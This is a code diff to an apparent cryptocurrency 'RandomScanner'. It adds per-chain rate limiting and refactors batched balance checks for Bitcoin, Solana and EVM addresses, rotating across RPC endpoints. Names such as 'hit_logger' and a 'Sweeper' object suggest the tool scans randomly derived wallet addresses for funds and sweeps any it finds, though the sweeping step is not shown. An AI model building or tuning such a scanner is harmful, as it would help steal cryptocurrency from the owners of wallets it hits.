@@ -76,6 +76,10 @@ class RandomScanner:
         self.hit_logger = hit_logger
         self._api_semaphore = asyncio.Semaphore(api_concurrency)
         self._btc_semaphore = asyncio.Semaphore(5)  # BTC gets lower concurrency (free APIs are rate-limited)
+        # Per-chain rate limiters: serialize balance checks per chain with min interval
+        self._chain_locks: dict[str, asyncio.Lock] = {}
+        self._chain_last_call: dict[str, float] = {}
+        self._chain_min_interval: dict[str, float] = {}  # Set in run() after chains are known
         self._shutdown = False
         self._stats = ScannerStats()
         self._client: Optional[httpx.AsyncClient] = None  # shared HTTP client
@@ -176,6 +180,19 @@ class RandomScanner:
         )
         # Create shared sweeper (reuses the shared HTTP client)
         self._sweeper = Sweeper(client=self._client)
+
+        # Initialize per-chain rate limiters
+        self._chain_locks = {}
+        self._chain_last_call = {}
+        for chain in self.chains:
+            self._chain_locks[chain.name] = asyncio.Lock()
+            self._chain_last_call[chain.name] = 0.0
+            if chain.chain_type == ChainType.BITCOIN:
+                self._chain_min_interval[chain.name] = 0.5  # 2 calls/sec for BTC REST
+            elif chain.chain_type == ChainType.SOLANA:
+                self._chain_min_interval[chain.name] = 0.25  # 4 calls/sec for SOL
+            else:
+                self._chain_min_interval[chain.name] = 0.2  # 5 calls/sec for EVM batch
 
         # Install signal handlers for graceful shutdown
         loop = asyncio.get_running_loop()
@@ -371,104 +388,124 @@ class RandomScanner:
             if chain_cfg is None:
                 continue
 
-            # Rotate endpoint with rate limiting
-            rotator = self._rotators.get(chain_cfg.coin_id)
-            rotated_cfg = copy.copy(chain_cfg)
-            used_url = ""
-            if rotator:
-                url = rotator.next()
-                # Respect per-endpoint rate limit
-                wait = rotator.get_wait_time(url)
-                if wait > 0:
-                    await asyncio.sleep(wait)
-                rotator.record_request(url)
-                if chain_cfg.chain_type == ChainType.BITCOIN:
-                    rotated_cfg.api_url = url
-                else:
-                    rotated_cfg.rpc_url = url
-                used_url = rotated_cfg.api_url or rotated_cfg.rpc_url or ""
+            # Per-chain rate limiting: serialize calls with minimum interval
+            lock = self._chain_locks.get(chain_name)
+            if lock:
+                async with lock:
+                    interval = self._chain_min_interval.get(chain_name, 0.2)
+                    now = time.monotonic()
+                    elapsed = now - self._chain_last_call.get(chain_name, 0)
+                    if elapsed < interval:
+                        await asyncio.sleep(interval - elapsed)
+                    self._chain_last_call[chain_name] = time.monotonic()
+                    results = await self._check_chain_balances(chain_name, idx_addrs, chain_cfg, results)
+            else:
+                results = await self._check_chain_balances(chain_name, idx_addrs, chain_cfg, results)
 
-            try:
-                if chain_cfg.chain_type == ChainType.SOLANA:
-                    # SOL: batch via getMultipleAccounts (up to 100 per call)
-                    from src.modules.crypto.balance.multicall import batch_check_sol_balances
-                    addr_list = [a.address for _, a in idx_addrs]
-                    sol_results = await batch_check_sol_balances(
-                        addr_list, rotated_cfg.rpc_url or "", client=self._client,
-                    )
-                    for (idx, addr), br in zip(idx_addrs, sol_results):
-                        if br.error:
+        return results
+
+    async def _check_chain_balances(
+        self,
+        chain_name: str,
+        idx_addrs: list[tuple[int, "DerivedAddress"]],
+        chain_cfg: "ChainConfig",
+        results: list,
+    ) -> list:
+        """Check balances for one chain — batched for EVM/SOL, individual for BTC."""
+        import copy
+        from src.modules.crypto.balance.multicall import batch_check_balances
+
+        rotator = self._rotators.get(chain_cfg.coin_id)
+        rotated_cfg = copy.copy(chain_cfg)
+        used_url = ""
+        if rotator:
+            url = rotator.next()
+            wait = rotator.get_wait_time(url)
+            if wait > 0:
+                await asyncio.sleep(wait)
+            rotator.record_request(url)
+            if chain_cfg.chain_type == ChainType.BITCOIN:
+                rotated_cfg.api_url = url
+            else:
+                rotated_cfg.rpc_url = url
+            used_url = rotated_cfg.api_url or rotated_cfg.rpc_url or ""
+
+        try:
+            if chain_cfg.chain_type == ChainType.SOLANA:
+                from src.modules.crypto.balance.multicall import batch_check_sol_balances
+                from src.modules.crypto.balance.checker import BalanceResult
+                addr_list = [a.address for _, a in idx_addrs]
+                sol_results = await batch_check_sol_balances(
+                    addr_list, rotated_cfg.rpc_url or "", client=self._client,
+                )
+                for (idx, addr), br in zip(idx_addrs, sol_results):
+                    if br.error:
+                        self._stats.api_errors += 1
+                        if rotator:
+                            rotator.report_failure(used_url)
+                        results[idx] = BalanceResult(
+                            address=addr.address, chain=chain_name,
+                            symbol=chain_cfg.symbol, balance=0.0,
+                            balance_raw=0, usd_price=0.0, usd_value=0.0,
+                            derivation_path=addr.derivation_path, error=br.error,
+                        )
+                    else:
+                        if rotator:
+                            rotator.report_success(used_url)
+                        results[idx] = BalanceResult(
+                            address=addr.address, chain=chain_name,
+                            symbol=chain_cfg.symbol,
+                            balance=br.balance_wei / 1e9,
+                            balance_raw=br.balance_wei,
+                            usd_price=0.0, usd_value=0.0,
+                            derivation_path=addr.derivation_path,
+                        )
+            elif chain_cfg.chain_type == ChainType.BITCOIN:
+                async def _check_btc(idx: int, addr) -> tuple[int, object]:
+                    async with self._btc_semaphore:
+                        r = await check_balance(addr.address, rotated_cfg, addr.derivation_path, client=self._client)
+                        if r.error:
                             self._stats.api_errors += 1
                             if rotator:
                                 rotator.report_failure(used_url)
-                            from src.modules.crypto.balance.checker import BalanceResult
-                            results[idx] = BalanceResult(
-                                address=addr.address, chain=chain_name,
-                                symbol=chain_cfg.symbol, balance=0.0,
-                                balance_raw=0, usd_price=0.0, usd_value=0.0,
-                                derivation_path=addr.derivation_path, error=br.error,
-                            )
                         else:
                             if rotator:
                                 rotator.report_success(used_url)
-                            from src.modules.crypto.balance.checker import BalanceResult
-                            results[idx] = BalanceResult(
-                                address=addr.address, chain=chain_name,
-                                symbol=chain_cfg.symbol,
-                                balance=br.balance_wei / 1e9,
-                                balance_raw=br.balance_wei,
-                                usd_price=0.0, usd_value=0.0,
-                                derivation_path=addr.derivation_path,
-                            )
-                elif chain_cfg.chain_type == ChainType.BITCOIN:
-                    # BTC: concurrent calls with dedicated low-concurrency semaphore
-                    async def _check_btc(idx: int, addr) -> tuple[int, object]:
-                        async with self._btc_semaphore:
-                            r = await check_balance(addr.address, rotated_cfg, addr.derivation_path, client=self._client)
-                            if r.error:
-                                self._stats.api_errors += 1
-                                if rotator:
-                                    rotator.report_failure(used_url)
-                            else:
-                                if rotator:
-                                    rotator.report_success(used_url)
-                            return idx, r
+                        return idx, r
 
-                    btc_tasks = [_check_btc(idx, addr) for idx, addr in idx_addrs]
-                    for coro in asyncio.as_completed(btc_tasks):
-                        idx, result = await coro
-                        results[idx] = result
-                else:
-                    # EVM/SOL: batch all addresses in one HTTP request
-                    addr_list = [a.address for _, a in idx_addrs]
-                    batch_results = await batch_check_balances(addr_list, rotated_cfg, client=self._client)
-                    for (idx, addr), br in zip(idx_addrs, batch_results):
-                        if br.error:
-                            self._stats.api_errors += 1
-                            if rotator:
-                                rotator.report_failure(used_url)
-                            from src.modules.crypto.balance.checker import BalanceResult
-                            results[idx] = BalanceResult(
-                                address=addr.address, chain=chain_name,
-                                symbol=chain_cfg.symbol, balance=0.0,
-                                balance_raw=0, usd_price=0.0, usd_value=0.0,
-                                derivation_path=addr.derivation_path, error=br.error,
-                            )
-                        else:
-                            if rotator:
-                                rotator.report_success(used_url)
-                            from src.modules.crypto.balance.checker import BalanceResult
-                            balance = br.balance_wei / (10 ** chain_cfg.decimals)
-                            results[idx] = BalanceResult(
-                                address=addr.address, chain=chain_name,
-                                symbol=chain_cfg.symbol, balance=balance,
-                                balance_raw=br.balance_wei, usd_price=0.0,
-                                usd_value=0.0,
-                                derivation_path=addr.derivation_path,
-                            )
-            except Exception as e:
-                self._stats.api_errors += len(idx_addrs)
-                logger.debug("Batch balance check error for %s: %s", chain_name, e)
+                btc_tasks = [_check_btc(idx, addr) for idx, addr in idx_addrs]
+                for coro in asyncio.as_completed(btc_tasks):
+                    idx, result = await coro
+                    results[idx] = result
+            else:
+                from src.modules.crypto.balance.checker import BalanceResult
+                addr_list = [a.address for _, a in idx_addrs]
+                batch_results = await batch_check_balances(addr_list, rotated_cfg, client=self._client)
+                for (idx, addr), br in zip(idx_addrs, batch_results):
+                    if br.error:
+                        self._stats.api_errors += 1
+                        if rotator:
+                            rotator.report_failure(used_url)
+                        results[idx] = BalanceResult(
+                            address=addr.address, chain=chain_name,
+                            symbol=chain_cfg.symbol, balance=0.0,
+                            balance_raw=0, usd_price=0.0, usd_value=0.0,
+                            derivation_path=addr.derivation_path, error=br.error,
+                        )
+                    else:
+                        if rotator:
+                            rotator.report_success(used_url)
+                        balance = br.balance_wei / (10 ** chain_cfg.decimals)
+                        results[idx] = BalanceResult(
+                            address=addr.address, chain=chain_name,
+                            symbol=chain_cfg.symbol, balance=balance,
+                            balance_raw=br.balance_wei, usd_price=0.0,
+                            usd_value=0.0,
+                            derivation_path=addr.derivation_path,
+                        )
+        except Exception as e:
+            self._stats.api_errors += len(idx_addrs)
+            logger.debug("Batch balance check error for %s: %s", chain_name, e)
 
         return results
 
